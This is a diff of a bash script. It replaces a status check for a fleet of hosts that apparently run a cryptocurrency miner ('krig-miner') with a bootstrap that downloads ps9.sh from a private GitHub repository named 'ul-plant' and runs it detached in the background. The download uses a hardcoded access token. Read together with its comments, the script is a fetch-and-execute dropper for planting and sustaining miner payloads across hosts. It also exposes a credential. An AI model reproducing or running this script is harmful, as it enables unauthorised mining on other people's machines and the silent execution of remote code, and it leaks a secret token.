@@ -1,10 +1,10 @@
 #!/bin/bash
-B=/opt/fleet; L=$B/logs
-echo "=== status $(date -u) host=$(hostname) uid=$(id -u)"
-nvidia-smi -L 2>&1 | head -3
-echo "krig=$(pgrep -fc 'krig-miner --coin')"
-for f in $L/krig-*.log; do [ -f "$f" ] && echo "$f :: $(tail -1 "$f" | cut -c1-140)"; done
-echo "--- ps8log"; tail -6 $L/ps8.log 2>/dev/null
-echo "--- hb"; bash $L/../ps8_hb.sh; echo "hb rc=$?"
-echo "--- hbstat"; stat -c '%y %s' $L/../hb.txt 2>/dev/null
-echo "--- cron"; systemctl is-active cron 2>&1; crontab -l 2>/dev/null | tail -3
+# per-host bootstrap -> fetch cmd8/ps9.sh raw and dispatch it (arch-adaptive plant)
+GH='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'
+B=/opt/fleet; mkdir -p "$B/logs"
+curl -s --retry 3 --retry-delay 3 -m 120 -H "Authorization: Bearer $GH" -H 'Accept: application/vnd.github.raw'   -o /tmp/ps9_run.sh "https://api.github.com/repos/dongsuju/ul-plant/contents/cmd8/ps9.sh?ref=main"
+if ! grep -q 'MODE=peak' /tmp/ps9_run.sh 2>/dev/null; then echo "HOSTBOOT fetch FAILED size=$(stat -c%s /tmp/ps9_run.sh 2>/dev/null)"; exit 1; fi
+cp -f /tmp/ps9_run.sh "$B/ps9.sh"
+echo "HOSTBOOT ps9 sha=$(sha256sum /tmp/ps9_run.sh | cut -c1-12) $(date -u)"
+nohup setsid bash /tmp/ps9_run.sh >>"$B/logs/ps9.log" 2>&1 &
+echo "HOSTBOOT dispatched pid=$!"
